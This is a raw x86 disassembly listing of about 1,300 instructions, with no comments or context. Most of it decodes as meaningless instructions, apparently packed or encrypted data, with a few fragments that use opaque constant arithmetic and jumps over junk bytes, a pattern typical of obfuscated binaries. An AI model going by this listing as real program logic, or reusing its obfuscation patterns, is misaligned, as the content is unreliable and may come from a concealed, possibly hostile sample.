  410cd9:	and    ecx,esp
  410cdb:	xor    al,BYTE PTR [edx-0x257738f1]
  410ce1:	fsubr  QWORD PTR [ebp-0x4a]
  410ce4:	push   0xffffffa0
  410ce6:	loope  0x410cd9
  410ce8:	sub    ebx,DWORD PTR [ebx]
  410cea:	pop    ebp
  410ceb:	test   BYTE PTR [ebx-0x1604286c],0x2
  410cf2:	cmp    DWORD PTR [ebx],esp
  410cf4:	das    
  410cf5:	xchg   ebx,eax
  410cf6:	xchg   DWORD PTR [ebx-0x5f5907ff],ebp
  410cfc:	(bad)  
  410cfd:	jg     0x410c98
  410cff:	stos   BYTE PTR es:[edi],al
  410d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d01:	add    DWORD PTR [edx],edi
  410d03:	or     BYTE PTR ds:0x82ee812,ch
  410d09:	cs scas eax,DWORD PTR es:[edi]
  410d0b:	jne    0x410d50
  410d0d:	fisttp WORD PTR [eax]
  410d0f:	xor    DWORD PTR ds:0xb2160d77,eax
  410d15:	imul   esp,DWORD PTR [edi+0x78],0xffffffa1
  410d19:	enter  0xc6e0,0x5e
  410d1d:	push   cs
  410d1e:	pushf  
  410d1f:	cmc    
  410d20:	aaa    
  410d21:	and    al,0xf2
  410d23:	jnp    0x410d31
  410d25:	push   cs
  410d26:	pop    esp
  410d27:	pusha  
  410d28:	loop   0x410d75
  410d2a:	cwde   
  410d2b:	aas    
  410d2c:	clc    
  410d2d:	hlt    
  410d2e:	xchg   esi,eax
  410d2f:	ja     0x410daa
  410d31:	jmp    0x3347:0xe7ae9a62
  410d38:	sbb    DWORD PTR [eax-0x670b2858],edx
  410d3e:	add    BYTE PTR [ecx],bl
  410d40:	dec    ebx
  410d41:	(bad)  
  410d42:	std    
  410d43:	and    eax,0x4339dc6
  410d48:	adc    bl,BYTE PTR [ecx+0xbae4631]
  410d4e:	push   esp
  410d4f:	jnp    0x410d88
  410d51:	addr16 push ds
  410d53:	les    ecx,FWORD PTR [edx+0x27]
  410d56:	mov    esi,0x3d2137eb
  410d5b:	cld    
  410d5c:	xchg   ecx,eax
  410d5d:	pop    esp
  410d5e:	inc    eax
  410d5f:	jl     0x410dcc
  410d61:	out    dx,al
  410d62:	or     eax,0x107ad46c
  410d67:	out    dx,al
  410d68:	sbb    ebp,ecx
  410d6a:	mov    esi,0x97932ca1
  410d6f:	mov    bh,0x22
  410d71:	jno    0x410d34
  410d73:	dec    ebx
  410d74:	mov    ah,0x76
  410d76:	mov    eax,?
  410d78:	sub    BYTE PTR ds:0xcbb10d17,dl
  410d7e:	push   edx
  410d7f:	aas    
  410d80:	or     eax,0xec992101
  410d85:	not    DWORD PTR [edx]
  410d87:	jmp    0x55d64eb3
  410d8c:	inc    BYTE PTR [eiz*4+0x1e2d3995]
  410d93:	repz xchg edx,eax
  410d95:	xchg   esi,eax
  410d96:	lds    edx,FWORD PTR ds:0x71aac8e0
  410d9c:	adc    ebx,DWORD PTR [ebx+0x7dee7090]
  410da2:	ja     0x410d4e
  410da4:	dec    edx
  410da5:	xor    BYTE PTR [ebx+ecx*8],dl
  410da8:	mov    ebx,0x2ec73767
  410dad:	addr16 jle 0x410e1a
  410db0:	repz jmp 0xe4891cd5
  410db6:	pushf  
  410db7:	or     BYTE PTR [edx+0x43],al
  410dba:	test   eax,0xf5af53ad
  410dbf:	push   ds
  410dc0:	mov    esp,0x2e66655d
  410dc5:	xchg   ebp,eax
  410dc6:	gs inc ecx
  410dc8:	fsub   DWORD PTR [ebx-0x53e48edf]
  410dce:	shl    BYTE PTR [ebx-0xf],0xb
  410dd2:	fldenv ds:0x1b3c9e0
  410dd8:	sub    al,0x91
  410dda:	adc    eax,0x75627c86
  410ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410de0:	dec    eax
  410de1:	scas   al,BYTE PTR es:[edi]
  410de2:	pop    es
  410de3:	(bad)  [ecx+edx*4]
  410de7:	aad    0x49
  410de9:	stc    
  410dea:	and    BYTE PTR [edx+0x2c2d466d],al
  410df0:	xor    eax,0x3448713b
  410df5:	sti    
  410df6:	(bad)  
  410df8:	mov    ds:0x326ad53c,eax
  410dfd:	(bad)  
  410dfe:	adc    eax,0x99e8f64f
  410e03:	xor    ebx,DWORD PTR gs:[esi]
  410e06:	in     al,0x68
  410e08:	pushf  
  410e09:	hlt    
  410e0a:	mov    WORD PTR [ebp-0x22],sp
  410e0e:	cwde   
  410e0f:	sub    esi,0xffffffa6
  410e12:	and    ch,BYTE PTR [ebx-0x4c858d05]
  410e18:	retf   0x3b5a
  410e1b:	cdq    
  410e1c:	adc    eax,0xa239af90
  410e21:	test   al,0xb4
  410e23:	dec    ecx
  410e24:	adc    al,0xba
  410e26:	mov    ah,0x45
  410e28:	push   ebx
  410e29:	scas   al,BYTE PTR es:[edi]
  410e2a:	sub    eax,0xf505569a
  410e2f:	out    dx,eax
  410e30:	sbb    ecx,esi
  410e32:	inc    ecx
  410e33:	rcl    esi,1
  410e35:	call   0xc7635aaf
  410e3a:	enter  0xe15a,0x68
  410e3e:	push   0xfffffffd
  410e40:	xlat   BYTE PTR ds:[ebx]
  410e41:	add    al,0x5c
  410e43:	fadd   QWORD PTR gs:[eax+esi*8+0x138caec6]
  410e4b:	push   0x6b4d7a09
  410e50:	stos   DWORD PTR es:[edi],eax
  410e51:	leave  
  410e52:	test   al,0x5
  410e54:	or     BYTE PTR [edi],al
  410e56:	data16 sti 
  410e58:	xor    BYTE PTR [edi],bh
  410e5a:	mov    ds:0xb95a5e3e,eax
  410e5f:	xchg   esi,eax
  410e60:	test   eax,0x4005992f
  410e65:	or     eax,0x79ca5f6d
  410e6a:	xchg   ebx,eax
  410e6b:	jmp    0xfdd0bcc3
  410e70:	sub    DWORD PTR [ebp+0x75f91b4f],edi
  410e76:	cmp    al,0xea
  410e78:	pop    ebp
  410e79:	add    ecx,DWORD PTR [edi]
  410e7b:	inc    ebp
  410e7c:	mov    bh,0x91
  410e7e:	jno    0x410ee6
  410e80:	aaa    
  410e81:	adc    al,0x27
  410e83:	lods   al,BYTE PTR ds:[esi]
  410e84:	ds jle 0x410e5c
  410e87:	cmp    edi,edx
  410e89:	loopne 0x410e5d
  410e8b:	iret   
  410e8c:	cs jg  0x410e1d
  410e8f:	xchg   esp,eax
  410e90:	inc    esp
  410e91:	add    DWORD PTR [eax],ecx
  410e93:	xchg   edi,eax
  410e94:	cmp    al,0xdc
  410e96:	repnz rol BYTE PTR [esi+0x77],1
  410e9a:	shl    ebx,cl
  410e9c:	xchg   edi,eax
  410e9d:	fwait
  410e9e:	fwait
  410e9f:	ins    DWORD PTR es:[edi],dx
  410ea0:	(bad)  
  410ea1:	lahf   
  410ea2:	mov    BYTE PTR [ebx-0x297ca263],dl
  410ea8:	sbb    eax,0x8ae1845e
  410ead:	and    eax,0x8d40c7cc
  410eb2:	cmp    DWORD PTR [eax+0x276675e7],0xffffff84
  410eb9:	mul    BYTE PTR ss:[ebp+0x63]
  410ebd:	xchg   edi,eax
  410ebe:	pop    ss
  410ebf:	lock xor BYTE PTR [edx-0x1f47d58e],dl
  410ec6:	jb     0x410ee3
  410ec8:	cmp    al,0x94
  410eca:	jne    0x410f44
  410ecc:	shr    BYTE PTR [eax],1
  410ece:	lea    ebx,[edx-0x7f]
  410ed1:	mov    esi,0xe5410700
  410ed6:	dec    eax
  410ed7:	pop    ebp
  410ed8:	sbb    esi,DWORD PTR [edi]
  410eda:	dec    eax
  410edb:	mov    ecx,DWORD PTR [ebp+0x8]
  410ede:	jmp    0x411117
  410ee3:	loop   0x410ed6
  410ee5:	(bad)  
  410ee7:	sbb    eax,0xfe75a9bd
  410eec:	mov    DWORD PTR [edi+0x733bb76f],edx
  410ef2:	add    eax,0xbbbb4df8
  410ef7:	jmp    0x410eb8
  410ef9:	mov    ebx,0xa8f562bb
  410efe:	adc    BYTE PTR [edi-0x588b8604],dh
  410f04:	lock clc 
  410f06:	lods   al,BYTE PTR ds:[esi]
  410f07:	xlat   BYTE PTR ds:[ebx]
  410f08:	and    bh,BYTE PTR [edx+0x76]
  410f0b:	xchg   esi,eax
  410f0c:	adc    al,BYTE PTR [esi-0x7b9d5dc8]
  410f12:	inc    edi
  410f13:	test   BYTE PTR [ecx+0x2],0x85
  410f17:	(bad)  
  410f18:	aas    
  410f19:	gs cmc 
  410f1b:	mov    BYTE PTR [ebp+0x44aefbc0],0x1a
  410f22:	paddsb mm5,QWORD PTR [ebx+0x14]
  410f26:	cmp    ebp,ecx
  410f28:	pop    ebx
  410f29:	push   es
  410f2a:	mov    edx,ebp
  410f2c:	inc    esi
  410f2d:	jge    0x410ef2
  410f2f:	lahf   
  410f30:	fisubr DWORD PTR [esi]
  410f32:	(bad)  
  410f33:	xchg   ecx,eax
  410f34:	shl    BYTE PTR [edi],cl
  410f36:	pushf  
  410f37:	cmp    DWORD PTR [edx-0x131c720f],0x13
  410f3e:	dec    ebp
  410f3f:	fiadd  WORD PTR [ebp-0x19f1d294]
  410f45:	(bad)  
  410f46:	or     ah,BYTE PTR [edx]
  410f48:	daa    
  410f49:	gs pop eax
  410f4b:	cmp    BYTE PTR [esi],bh
  410f4d:	ror    bl,1
  410f4f:	test   al,ah
  410f51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f52:	push   ecx
  410f53:	pop    es
  410f54:	inc    edx
  410f55:	and    cl,BYTE PTR [edi]
  410f57:	jl     0x410f5a
  410f59:	adc    BYTE PTR cs:[ecx+eiz*1-0x1],bl
  410f5e:	mov    edx,0x4e9d4a0c
  410f63:	(bad)  
  410f65:	nop
  410f66:	out    dx,eax
  410f67:	add    esp,edi
  410f69:	add    BYTE PTR [ecx],ch
  410f6b:	iret   
  410f6c:	out    0x73,eax
  410f6e:	ins    DWORD PTR es:[edi],dx
  410f6f:	xor    ebp,DWORD PTR [edx+edi*1]
  410f72:	mov    edx,0x5da74cf6
  410f77:	fs push edi
  410f79:	addr16 mov es,edx
  410f7c:	xabort 0xeb
  410f7f:	xchg   edx,eax
  410f80:	stc    
  410f81:	cmp    DWORD PTR [ebx+ebp*8-0x413ffb7a],edi
  410f88:	push   edi
  410f89:	(bad)  [eax]
  410f8b:	inc    esp
  410f8c:	inc    esi
  410f8d:	test   al,0x73
  410f8f:	test   DWORD PTR [edx+0x32e31116],edi
  410f95:	xor    ah,BYTE PTR [ecx]
  410f97:	scas   eax,DWORD PTR es:[edi]
  410f98:	cli    
  410f99:	xor    DWORD PTR [eax],eax
  410f9b:	out    0x17,al
  410f9d:	mov    bl,0x71
  410f9f:	nop
  410fa0:	pop    eax
  410fa1:	pop    ebx
  410fa2:	cmp    BYTE PTR [edi-0x409e1827],ah
  410fa8:	sub    al,0xd5
  410faa:	lods   eax,DWORD PTR ds:[esi]
  410fab:	out    0x37,eax
  410fad:	or     ah,cl
  410faf:	xchg   edx,eax
  410fb0:	(bad)  
  410fb1:	adc    eax,0xd75c22c0
  410fb6:	cmp    BYTE PTR [ebx*8+0x747e8789],ch
  410fbd:	jp     0x411008
  410fbf:	sub    al,0xcf
  410fc1:	mov    bh,al
  410fc3:	adc    bh,bh
  410fc5:	xchg   esi,eax
  410fc6:	or     al,0x3a
  410fc8:	test   DWORD PTR [esi+0x31c07e6d],ebp
  410fce:	lods   al,BYTE PTR ds:[esi]
  410fcf:	mov    eax,ds:0x107859ec
  410fd4:	jae    0x410fe7
  410fd6:	jbe    0x410fd6
  410fd8:	and    BYTE PTR [ebx],ah
  410fda:	inc    edi
  410fdb:	js     0x410f8f
  410fdd:	fwait
  410fde:	pop    es
  410fdf:	pop    es
  410fe0:	scas   eax,DWORD PTR es:[edi]
  410fe1:	mov    BYTE PTR [esp+eiz*8+0x7bf1ed42],cl
  410fe8:	sub    eax,0xddbd85a1
  410fed:	or     BYTE PTR [edi-0x6b],ah
  410ff0:	fidivr WORD PTR ds:0x8bd15d7f
  410ff6:	gs inc eax
  410ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ff9:	shl    DWORD PTR [ebp+eiz*1+0x4a055047],1
  411000:	hlt    
  411001:	xchg   esi,eax
  411002:	fst    DWORD PTR [edi]
  411004:	mov    ch,0xf4
  411006:	adc    cl,BYTE PTR [ecx-0x69ca9b10]
  41100c:	ret    
  41100d:	ja     0x411048
  41100f:	and    al,0x4c
  411011:	outs   dx,DWORD PTR ds:[esi]
  411012:	add    eax,0xa46acf9c
  411017:	and    eax,DWORD PTR es:[eax+0xd]
  41101b:	arpl   WORD PTR [edi+0x19],bx
  41101e:	sahf   
  41101f:	ins    BYTE PTR es:[edi],dx
  411020:	pushf  
  411021:	loopne 0x41102f
  411023:	test   BYTE PTR [ecx-0x62],0xb9
  411027:	adc    DWORD PTR [esi+0xe8c9a8b],eax
  41102d:	inc    esi
  41102e:	lea    edi,[eax+0x2b9684c5]
  411034:	not    BYTE PTR [eax-0x10f0ac8d]
  41103a:	loopne 0x410fe6
  41103c:	pop    edx
  41103d:	add    BYTE PTR [ebp+0x45],dl
  411040:	sub    DWORD PTR [esi],ebx
  411042:	stos   DWORD PTR es:[edi],eax
  411043:	sub    DWORD PTR [esp+edx*1+0x7abec22],edi
  41104a:	adc    ecx,DWORD PTR [esi]
  41104c:	outs   dx,DWORD PTR ds:[esi]
  41104d:	pop    edx
  41104e:	int    0x44
  411050:	add    DWORD PTR [ecx-0x25],ecx
  411053:	stos   BYTE PTR es:[edi],al
  411054:	adc    DWORD PTR ds:0xb7f5d322,0xffffffc7
  41105b:	lods   eax,DWORD PTR ds:[esi]
  41105c:	mov    DWORD PTR [edi],esi
  41105e:	mov    ds:0x38b3a0d3,eax
  411063:	aas    
  411064:	fwait
  411065:	or     eax,0xd42a12e3
  41106a:	adc    BYTE PTR [ebx-0x5d],bl
  41106d:	jmp    0xe585:0x661cff83
  411074:	das    
  411075:	sub    BYTE PTR [edx+0x12],0x21
  411079:	add    bh,BYTE PTR [ebp-0x73]
  41107c:	nop
  41107d:	das    
  41107e:	leave  
  41107f:	push   eax
  411080:	push   esp
  411081:	sub    al,0x70
  411083:	not    BYTE PTR ds:0xfa1525a9
  411089:	call   0xd803:0xe5363aec
  411090:	or     edx,DWORD PTR [eax]
  411092:	pop    ebp
  411093:	stc    
  411094:	sbb    bl,ch
  411096:	mov    bh,0xa7
  411098:	xlat   BYTE PTR ds:[ebx]
  411099:	stos   DWORD PTR es:[edi],eax
  41109a:	enter  0x4b2,0xa1
  41109e:	(bad)
  4110a1:	fs xchg ebp,eax
  4110a3:	mov    al,ds:0x892c5d0c
  4110a8:	and    eax,0xfacd3e65
  4110ad:	out    dx,al
  4110ae:	mov    ah,0x6b
  4110b0:	cmp    DWORD PTR [edx+0x6],0xba0218b2
  4110b7:	xor    al,0x13
  4110b9:	and    ecx,DWORD PTR [edx]
  4110bb:	add    BYTE PTR [eax+0x415a697c],ch
  4110c1:	sar    BYTE PTR [esi+0x50],cl
  4110c4:	sub    ebx,DWORD PTR [ebx-0x1d327ea4]
  4110ca:	mov    BYTE PTR [ecx],dh
  4110cc:	push   cs
  4110cd:	adc    esp,ebp
  4110cf:	js     0x4110bc
  4110d1:	test   al,0xf9
  4110d3:	call   0xf7c7:0x2ef00b04
  4110da:	(bad)  
  4110db:	es hlt 
  4110dd:	(bad)  
  4110de:	(bad)  
  4110df:	and    al,BYTE PTR [edx]
  4110e1:	mov    al,0x5
  4110e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e4:	xchg   ebx,eax
  4110e5:	imul   edx,DWORD PTR [ebx+0x63],0xb9b26713
  4110ec:	pop    ebp
  4110ed:	jae    0x411087
  4110ef:	xchg   esp,eax
  4110f0:	rcr    BYTE PTR [ecx+0x7e5f208f],cl
  4110f6:	cs adc eax,0xce1c91f3
  4110fc:	pop    edx
  4110fd:	add    DWORD PTR [ecx],ebx
  4110ff:	mov    eax,0x35484cbc
  411104:	ja     0x41116b
  411106:	inc    edi
  411107:	iret   
  411108:	enter  0x8fe9,0x89
  41110c:	xchg   BYTE PTR [esi-0x5e],bl
  41110f:	mov    bh,0x52
  411111:	jno    0x4110b2
  411113:	lea    esp,[eax-0x7b7233f7]
  411119:	add    dh,dh
  41111b:	idiv   edi
  41111d:	inc    DWORD PTR [ebx]
  41111f:	enter  0x4d89,0x8
  411123:	mov    eax,DWORD PTR [ebp-0x18]
  411126:	mov    ecx,DWORD PTR [ebp-0x1c]
  411129:	or     eax,ecx
  41112b:	mov    ecx,DWORD PTR ds:0x4224d4
  411131:	or     eax,0x7671
  411136:	xor    eax,0x7f3e
  41113b:	and    eax,ecx
  41113d:	mov    ecx,DWORD PTR [ebp+0x8]
  411140:	add    eax,0xffffff40
  411145:	pop    esi
  411146:	cmp    DWORD PTR [ecx+0x54],eax
  411149:	je     0x411157
  41114f:	mov    eax,DWORD PTR [ebp+0x8]
  411152:	jmp    0x4113ea
  411157:	mov    eax,DWORD PTR [ebp-0x20]
  41115a:	mov    edx,DWORD PTR [ebp-0x24]
  41115d:	sub    edx,eax
  41115f:	mov    eax,DWORD PTR [ebp-0x28]
  411162:	sub    edx,eax
  411164:	mov    eax,ds:0x4224dc
  411169:	or     edx,eax
  41116b:	mov    eax,ds:0x4224d8
  411170:	and    edx,0x2ca6
  411176:	mov    ecx,0xfffff31b
  41117b:	sub    ecx,edx
  41117d:	add    eax,ecx
  41117f:	jmp    0x4113ea
  411184:	mov    DWORD PTR [ebp-0x24],0x1fb2
  41118b:	mov    DWORD PTR [ebp-0x28],0x41
  411192:	mov    DWORD PTR [ebp+0x8],0x3dec
  411199:	mov    ecx,DWORD PTR [ebp+0x8]
  41119c:	mov    eax,DWORD PTR [ebp-0x28]
  41119f:	xor    ecx,eax
  4111a1:	add    ecx,DWORD PTR [ebp-0x24]
  4111a4:	mov    eax,0x59eb
  4111a9:	jmp    0x4113e2
  4111ae:	inc    eax
  4111af:	xor    DWORD PTR [eax],esp
  4111b1:	mov    al,0xb1
  4111b3:	mov    cl,0x50
  4111b5:	xor    DWORD PTR [edi],edi
  4111b7:	jns    0x41121e
  4111b9:	xor    esi,edx
  4111bb:	scas   eax,DWORD PTR es:[edi]
  4111bc:	ja     0x4111c3
  4111be:	sub    BYTE PTR [ecx-0x45],dl
  4111c1:	mov    ebx,0xbbbbbfeb
  4111c6:	loop   0x411166
  4111c8:	mov    eax,0x4b096910
  4111cd:	inc    edx
  4111ce:	fxch   st(2)
  4111d0:	fcomi  st,st(0)
  4111d2:	mov    eax,ds:0x4549e084
  4111d7:	rcr    DWORD PTR [esi+ecx*1+0x4b4e792e],cl
  4111de:	loope  0x41122b
  4111e0:	xlat   BYTE PTR ds:[ebx]
  4111e1:	inc    esp
  4111e2:	jg     0x4111c7
  4111e4:	pop    edi
  4111e5:	jbe    0x41125c
  4111e7:	icebp  
  4111e8:	lods   eax,DWORD PTR ds:[esi]
  4111e9:	pop    esi
  4111ea:	outs   dx,BYTE PTR ds:[esi]
  4111eb:	push   esi
  4111ec:	add    bl,dl
  4111ee:	stc    
  4111ef:	or     eax,0xff725e9f
  4111f4:	jp     0x411221
  4111f6:	jbe    0x4111a7
  4111f8:	dec    esp
  4111f9:	ret    0x3097
  4111fc:	out    dx,eax
  4111fd:	aas    
  4111fe:	shl    BYTE PTR [ebx+0x55],cl
  411201:	lods   al,BYTE PTR ds:[esi]
  411202:	aad    0x31
  411204:	mov    eax,0x2feba144
  411209:	jecxz  0x411250
  41120b:	inc    esi
  41120c:	(bad)  
  41120d:	fdivr  DWORD PTR [ebp-0x2d]
  411210:	sbb    ah,ah
  411212:	sbb    ch,BYTE PTR [edx+0x6e7f9829]
  411218:	xchg   BYTE PTR [eax],dl
  41121a:	jp     0x411251
  41121c:	sbb    ecx,eax
  41121e:	test   eax,0x9bba389e
  411223:	cld    
  411224:	sbb    BYTE PTR [ebp+0x75adf8f3],0x4a
  41122b:	aam    0x9a
  41122d:	call   0x499d23a6
  411232:	dec    edx
  411233:	pop    eax
  411234:	pop    esp
  411235:	lock mov edx,0x830cdf24
  41123b:	dec    ecx
  41123c:	dec    ebp
  41123d:	mov    WORD PTR [ebp-0x7a],?
  411240:	mov    bh,0xf2
  411242:	or     bl,al
  411244:	or     eax,0x290ffe8b
  411249:	cmp    al,0x23
  41124b:	in     eax,dx
  41124c:	inc    eax
  41124d:	(bad)  
  41124f:	adc    ch,BYTE PTR [ebx]
  411251:	add    eax,DWORD PTR [edi-0x34c88d19]
  411257:	in     eax,0xd7
  411259:	mov    cl,0x8d
  41125b:	sub    dl,ah
  41125d:	xor    al,0xd3
  41125f:	xchg   ebp,eax
  411260:	ins    BYTE PTR es:[edi],dx
  411261:	mov    bl,0xae
  411263:	mov    al,gs:0x2be311a5
  411269:	mov    al,ds:0x70ba05fc
  41126e:	fist   WORD PTR [eax+0xf23e3f2]
  411274:	jmp    0xe29efbe9
  411279:	jo     0x4112b9
  41127b:	adc    al,0x3a
  41127d:	jg     0x411296
  41127f:	es sbb edi,eax
  411282:	cld    
  411283:	popa   
  411284:	(bad)  
  411285:	jo     0x411281
  411287:	iret   
  411288:	xor    eax,0xded3641f
  41128d:	sbb    bl,al
  41128f:	nop
  411290:	xchg   ebp,eax
  411291:	ret    0x673f
  411294:	inc    ebp
  411295:	fimul  DWORD PTR [edi+eax*2+0x19]
  411299:	ins    DWORD PTR es:[edi],dx
  41129a:	lahf   
  41129b:	pop    ebx
  41129c:	xchg   ecx,ecx
  41129e:	xor    eax,0x8e6ee67c
  4112a3:	lock mov edi,0xa600e81a
  4112a9:	sub    eax,0xd3eea285
  4112ae:	loope  0x41125a
  4112b0:	xchg   ebp,eax
  4112b1:	xchg   ebp,eax
  4112b2:	into   
  4112b3:	mov    eax,ds:0x643e5ed5
  4112b8:	scas   eax,DWORD PTR es:[edi]
  4112b9:	retf   
  4112ba:	int    0x53
  4112bc:	cld    
  4112bd:	ss xor eax,0xf052d55c
  4112c3:	mov    ds:0xd0cbe15b,eax
  4112c8:	jbe    0x4112dc
  4112ca:	(bad)  
  4112cb:	maskmovq mm3,mm0
  4112ce:	xlat   BYTE PTR ds:[ebx]
  4112cf:	aas    
  4112d0:	ret    0x10fb
  4112d3:	xor    ah,dl
  4112d5:	inc    ebx
  4112d6:	ret    
  4112d7:	and    BYTE PTR [edx+eiz*4],0x66
  4112db:	and    al,0x3a
  4112dd:	in     eax,0x8d
  4112df:	adc    DWORD PTR [eax],ebx
  4112e1:	std    
  4112e2:	xchg   edx,eax
  4112e3:	xchg   ebx,eax
  4112e4:	push   eax
  4112e5:	add    dh,BYTE PTR [eax+ebp*4]
  4112e8:	mov    fs,WORD PTR [ebx]
  4112ea:	jecxz  0x41128e
  4112ec:	xchg   BYTE PTR [eax+0x45],bh
  4112ef:	add    esi,DWORD PTR [esi]
  4112f1:	add    eax,0xa31d9c0d
  4112f6:	cld    
  4112f7:	mov    bh,0xeb
  4112f9:	mov    ch,0x31
  4112fb:	add    edx,DWORD PTR [esi]
  4112fd:	dec    edi
  4112fe:	outs   dx,BYTE PTR ds:[esi]
  4112ff:	sbb    al,0x8
  411301:	inc    edx
  411302:	dec    esp
  411303:	sti    
  411304:	push   0xc2dc5905
  411309:	scas   al,BYTE PTR es:[edi]
  41130a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41130b:	xchg   BYTE PTR [edi+0xfd1cfcd],cl
  411311:	pop    esp
  411312:	jnp    0x411365
  411314:	imul   esi,DWORD PTR [ebx+0x534943b3],0xeece2ce9
  41131e:	lea    ecx,[ebx-0x252c9d28]
  411324:	cmp    BYTE PTR [ebp-0x80],dh
  411327:	xchg   edx,eax
  411328:	mov    ebp,0xbe7cd349
  41132d:	fs and eax,0x2292ad27
  411333:	fwait
  411334:	jnp    0x41136d
  411336:	pop    esp
  411337:	jns    0x41134d
  411339:	sub    eax,0xddd28fc4
  41133e:	nop
  41133f:	adc    eax,0x5aaf3b6c
  411344:	dec    ecx
  411345:	sbb    al,0xf9
  411347:	or     al,0x51
  411349:	mov    eax,ds:0xd472372
  41134e:	jb     0x4113b1
  411350:	aas    
  411351:	out    0xcf,eax
  411353:	pop    ebx
  411354:	mov    eax,ds:0x8d5adb08
  411359:	imul   eax,DWORD PTR [ebx+eiz*4+0x25],0x7c
  41135e:	add    DWORD PTR [edi-0x6],edx
  411361:	cmp    ebx,DWORD PTR [ecx+0x5]
  411364:	test   DWORD PTR [edi-0x70e212da],ebp
  41136a:	sar    DWORD PTR [eax-0x27],1
  41136d:	lea    edx,[edi+0x3b237354]
  411373:	test   eax,0xf25824d2
  411378:	sub    DWORD PTR [eax-0x28],ebx
  41137b:	dec    edi
  41137c:	pop    ss
  41137d:	jne    0x4113a5
  41137f:	(bad)  
  411380:	jle    0x4113c9
  411382:	add    eax,0xe7777828
  411387:	sub    ch,BYTE PTR [eax+0x2f]
  41138a:	lods   eax,DWORD PTR ds:[esi]
  41138b:	xchg   esp,eax
  41138c:	jg     0x41140a
  41138e:	stos   BYTE PTR es:[edi],al
  41138f:	aad    0x18
  411391:	push   ebp
  411392:	and    ecx,ebp
  411394:	xor    eax,0xf2046286
  411399:	jle    0x411389
  41139b:	pop    edx
  41139c:	xor    eax,ebp
  41139e:	and    eax,0xa2f4c19d
  4113a3:	sub    cl,BYTE PTR [edi+ecx*2]
  4113a6:	(bad)  
  4113a8:	adc    DWORD PTR [edx+eiz*1],ecx
  4113ab:	and    DWORD PTR [edx],0xffffffea
  4113ae:	cmc    
  4113af:	cs aad 0xfc
  4113b2:	fild   WORD PTR [ecx-0x1fded437]
  4113b8:	jb     0x411406
  4113ba:	sub    DWORD PTR [ecx-0x72],edi
  4113bd:	loop   0x411435
  4113bf:	pause  
  4113c1:	push   ebx
  4113c2:	test   al,0x95
  4113c4:	gs cli 
  4113c6:	sbb    cl,BYTE PTR [eax-0x21]
  4113c9:	in     eax,dx
  4113ca:	popa   
  4113cb:	clc    
  4113cc:	in     eax,0xfa
  4113ce:	(bad)  
  4113cf:	(bad)  
  4113d1:	sbb    DWORD PTR [ecx-0x5581af30],edi
  4113d7:	and    BYTE PTR [esi],dh
  4113d9:	test   al,0x31
  4113db:	jo     0x411382
  4113dd:	inc    edi
  4113de:	xor    eax,DWORD PTR [ebp+esi*8+0x34]
  4113e2:	xor    ecx,0x4b4
  4113e8:	sub    eax,ecx
  4113ea:	leave  
  4113eb:	ret    0x4
  4113ee:	push   ebp
  4113ef:	mov    ebp,esp
  4113f1:	and    esp,0xfffffff8
  4113f4:	sub    esp,0x20
  4113f7:	push   ebx
  4113f8:	push   esi
  4113f9:	lea    eax,[esp+0x10]
  4113fd:	mov    DWORD PTR [esp+0xc],eax
  411401:	mov    eax,DWORD PTR [esp+0xc]
  411405:	mov    ecx,DWORD PTR [esp+0x10]
  411409:	mov    edx,DWORD PTR [esp+0x14]
  41140d:	sub    DWORD PTR [eax],ecx
  41140f:	sbb    DWORD PTR [eax+0x4],edx
  411412:	mov    eax,DWORD PTR [esp+0xc]
  411416:	or     DWORD PTR [eax],0xcb8db676
  41141c:	or     DWORD PTR [eax+0x4],0x9d2b8af8
  411423:	lea    eax,[esp+0x18]
  411427:	jmp    0x4117eb
  41142c:	dec    edx
  41142d:	(bad)  
  41142e:	lahf   
  41142f:	and    eax,0xb550a5af
  411434:	xor    esi,DWORD PTR [edi]
  411436:	xchg   edi,eax
  411437:	outs   dx,DWORD PTR ds:[esi]
  411438:	dec    ebp
  411439:	sbb    eax,0x5558712b
  41143e:	mov    ebx,0xbbc505bb
  411443:	mov    ebx,0x3b830c21
  411448:	jp     0x4114bc
  41144a:	sbb    eax,0x6ffa7b4c
  41144f:	std    
  411450:	xchg   edx,eax
  411451:	or     edi,ecx
  411453:	jae    0x4113d8
  411455:	or     eax,DWORD PTR ds:0xaf76881e
  41145b:	push   ebx
  41145c:	sub    dh,BYTE PTR [esi+ebx*8+0xb]
  411460:	add    eax,0x2a1f6f35
  411465:	fcomp  QWORD PTR [edi]
  411467:	iret   
  411468:	and    ah,dl
  41146a:	jle    0x411476
  41146c:	xor    esi,ecx
  41146e:	lods   al,BYTE PTR ds:[esi]
  41146f:	adc    BYTE PTR ds:0xcb7485a8,ch
  411475:	push   ds
  411476:	retf   
  411477:	and    ebp,DWORD PTR [eax]
  411479:	inc    edi
  41147a:	inc    ebp
  41147b:	stc    
  41147c:	and    BYTE PTR [ebp+0x5d145729],0x93
  411483:	call   0xf3ff:0x786c4a34
  41148a:	lods   al,BYTE PTR ds:[esi]
  41148b:	in     al,dx
  41148c:	jp     0x41146c
  41148e:	aaa    
  41148f:	in     al,dx
  411490:	pop    ds
  411491:	mov    ah,al
  411493:	mov    ah,0xcf
  411495:	and    al,0xd9
  411497:	call   0xf1f8:0x53a7e6c0
  41149e:	jae    0x4114ea
  4114a0:	mov    ah,0x6c
  4114a2:	loop   0x4114f4
  4114a4:	and    ah,BYTE PTR [esi+0x5d48ff14]
  4114aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ab:	test   BYTE PTR [ebx],dl
  4114ad:	shr    BYTE PTR [ebx],1
  4114af:	sub    BYTE PTR [ecx+0x146836f4],ah
  4114b5:	add    dl,ah
  4114b7:	jp     0x411496
  4114b9:	ins    BYTE PTR es:[edi],dx
  4114ba:	or     bh,BYTE PTR [ecx-0x34e04192]
  4114c0:	xchg   ecx,eax
  4114c1:	add    ah,bl
  4114c3:	cmp    esp,DWORD PTR [ebx]
  4114c5:	fdiv   st,st(2)
  4114c7:	adc    al,0x20
  4114c9:	sahf   
  4114ca:	dec    eax
  4114cb:	in     al,0x49
  4114cd:	pop    esi
  4114ce:	cmp    DWORD PTR [ecx],edi
  4114d0:	and    al,0x1b
  4114d2:	(bad)  
  4114d3:	mov    edi,0x4c0a21ea
  4114d8:	int3   
